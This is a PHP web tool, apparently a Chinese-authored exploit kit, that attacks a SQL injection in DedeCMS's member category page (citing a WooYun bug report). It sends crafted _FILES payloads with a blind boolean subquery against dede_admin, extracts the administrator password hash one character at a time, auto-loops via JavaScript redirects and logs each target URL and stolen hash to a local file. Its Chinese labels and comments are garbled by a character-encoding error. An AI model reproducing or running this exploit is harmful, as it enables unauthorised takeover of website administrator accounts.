<?php
session_start();
function curl_request($url,$post='',$cookie='', $returnCookie=0){
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)');
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_AUTOREFERER, 1);
        curl_setopt($curl, CURLOPT_REFERER, $url);
        if($post) {
            curl_setopt($curl, CURLOPT_POST, 1);
            curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
        }
        if($cookie) {
            curl_setopt($curl, CURLOPT_COOKIE, $cookie);
        }
        curl_setopt($curl, CURLOPT_HEADER, $returnCookie);
        curl_setopt($curl, CURLOPT_TIMEOUT, 10);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        $data = curl_exec($curl);
        if (curl_errno($curl)) {
            return curl_error($curl);
        }
        curl_close($curl);
        if($returnCookie){
            list($header, $body) = explode("\r\n\r\n", $data, 2);
            preg_match_all("/Set\-Cookie:([^;]*);/", $header, $matches);
            $info['cookie']  = substr($matches[1][0], 1);
            $info['content'] = $body;
            return $info;
        }else{
            return $data;
        }
}
function writetofile($contents,$filename) {
@$handle = fopen(dirname(__FILE__).'/'.$filename,"a+");
@fwrite($handle,$contents.chr(13).chr(10));
fclose($handle);
}

function random_keys($min, $max, $type = 'RANDSTR') {
    $returnStr = '';
    switch ($type) {
        case 'RANDNUM':
        case '�������':
            $pattern = '0123456789';
            break;

        case 'RANDLET':
        case '�����ĸ':
            $pattern = 'abcdefghijklmnopqrstuvwxyz';
            break;

        default:
            $pattern = '1234567890abcdefghijklmnopqrstuvwxyz';
    }
    $patternLen = strlen($pattern) - 1;
    for ($i = 0, $len = mt_rand($min, $max); $i < $len; $i++) {
        $returnStr.= $pattern{mt_rand(0, $patternLen) };
    }
    return $returnStr;
}

function getsubstrs($str,$s,$e){//ȡ�м��ַ�
$stra=explode($s,$str);
$strb=explode($e,$stra[1]);
return $strb[0];
}

$action=$_GET['action'];
switch ($action){
case 'seting':
$url=$_POST['url'];
$ids=$_POST['ids'];
$cookie=$_POST['cookie'];
$_SESSION['nowstr']='';
if ($url){
$_SESSION['url']=$url;
$_SESSION['ids']=$ids;
$_SESSION['cookiestr']=$cookie;
$randomkeys=random_keys(5,9);//������ɵ�
$poststr='_FILES[mtypename][name]=.xxxx&_FILES[mtypename][type]=xxxxx&_FILES[mtypename][tmp_name][a\' and `\'`.``.mtypeid or 1 and mtypeid%3d'.$_SESSION['ids'].'%23]='.$randomkeys.'&_FILES[mtypename][size]=.'.$randomkeys;
curl_request($_SESSION['url'].'?dopost=save',$poststr,$_SESSION['cookiestr']);
$gettxt=curl_request($_SESSION['url'],'',$_SESSION['cookiestr']);//��ȡ��ҳ�������
$found = strpos($gettxt,$randomkeys);
if ($found){
echo 'url: '.$url.'<br><br>����ID: '.$ids.'<br><br>cookie: '.$cookie.'<hr>';
echo '����װ�����';
echo '<form action="?action=post" method="post">';
echo '<button type="submit">��ʼ�½�</button></form>';
}else{
echo 'cookie���߷���ID ��ȡ����<br>���ߴ�վ©��������';
}
}else{
echo '����Ϊ��';
}
break;
case 'post':
if (strlen($_SESSION['nowstr'])<16){
$dic = array( 0=>'0', 1=>'1', 2=>'2', 3=>'3', 4=>'4', 5=>'5', 6=>'6', 7=>'7', 8=>'8',9=>'9', 10=>'a', 11=>'b', 12=>'c', 13=>'d', 14=>'e', 15=>'f');
$_GET['passpos']==''?$_SESSION['passpos']=4:$_SESSION['passpos']=$_GET['passpos'];//λ��
$_GET['passsub']==''?$passsub='0':$passsub=$_GET['passsub'];//Ҫ�µ��ַ�ֵ
$passstr=$dic[$passsub];//��ֵת���ַ�
$mtypenamesx=random_keys(5,9);//������ɵ�
$poststr='_FILES[mtypename][name]=.'.$mtypenamesx.'&_FILES[mtypename][type]=xxxxx&_FILES[mtypename][tmp_name][a\' and `\'`.``.mtypeid or if(ascii(substr((select pwd from dede_admin limit 1),'.$_SESSION['passpos'].',1))%3d'.ord($passstr).',1,0) and mtypeid%3d'.$_SESSION['ids'].'%23]='.$_SESSION['passpos'].'-'.$passstr.'&_FILES[mtypename][size]=.'.$mtypenamesx.'x';
$htmlsend=curl_request($_SESSION['url'].'?dopost=save',$poststr,$_SESSION['cookiestr']);
$htmlcontent=curl_request($_SESSION['url'],'',$_SESSION['cookiestr']);//��ȡ��ҳ�������
$nowstrs=getsubstrs($htmlcontent,'name="mtypename['.$_SESSION['ids'].']" value="','" class="text');
$nowstr=explode($_GET['passpos'].'-',$nowstrs);
if ($nowstr[1]<>''){
$_SESSION['nowstr'].=$nowstr[1];
$_SESSION['passpos']++;
}
if ($passsub>14){
$passsub=0;
}else{
$passsub++;
}
}
echo 'md5:'.$_SESSION['nowstr'];
echo ' <a href="?">����</a>';
if ($_SESSION['passpos']<20){
echo '<br><br><center><h2>���ڲ½��'.$_SESSION['passpos'].'λ�ַ�:['.$passstr.']<h2></center>';
echo '<script language="JavaScript">function setTimeout(){}</script>'.$htmlsend;
echo '<script language="JavaScript">window.top.location.replace ("?action=post&passpos='.$_SESSION['passpos'].'&passsub='.$passsub.'" );</script>';
}else{
writetofile($_SESSION['url'].'|'.$_SESSION['nowstr'],'creakok.txt');
echo ' ����½����';}
break;
default:
?>
<form action="?action=seting" method="post">
<table align=center width="90%" cellspacing="1" cellpadding=0 cellspacing=1 border="1" bordercolor="#C0C0C0">
<th width="10%">������</th>
<th>����ֵ</th>
</tr>
<tr><th >��ַ</th>
<td><input type="text" name="url" value="http://localhost/dede/member/mtypes.php" size=80></td>
</tr>
<tr><th >����ID</th>
<td><input type="text" name="ids" value="1" size=20></td>
</tr>
<tr><th >cookie</th>
<td><textarea name="cookie" cols="90"  rows="9">DedeUserID=3; DedeUserID__ckMd5=a540b4384d76249a</textarea></td>
</tr>
<tr><td colspan="6"><div>
<button type="submit">�ύ</button>
</div></td></tr>
<tr width="10%"><td colspan="6">
©����������http://wooyun.org/bugs/wooyun-2010-0127787<br>
ע���˺ŵ�½<br>
����http://localhost/dede/member/mtypes.php
��ӷ�����·���id<br>member/mtypes.php?dopost=save&_FILES[mtypename][name]=.xxxx&_FILES[mtypename][type]=xxxxx&_FILES[mtypename][tmp_name][a' and `'`.``.mtypeid or mtypeid%3d<font color='red'>1</font>%23]=w&_FILES[mtypename][size]=.xxxx<br>
�޸ĺ�ɫ�ķ���idֵ,Ȼ���ύ<br>����������Ƹı�Ϊw˵������©��<br>
�����д���ܴ��ڴ���������кõ��뷨�������ϵ��<br><br>
by ��ʦ������-<b>�ز�ȥ�Ĵ�ǰ</b></td></tr>
</table>
</form>
<?php
}
?>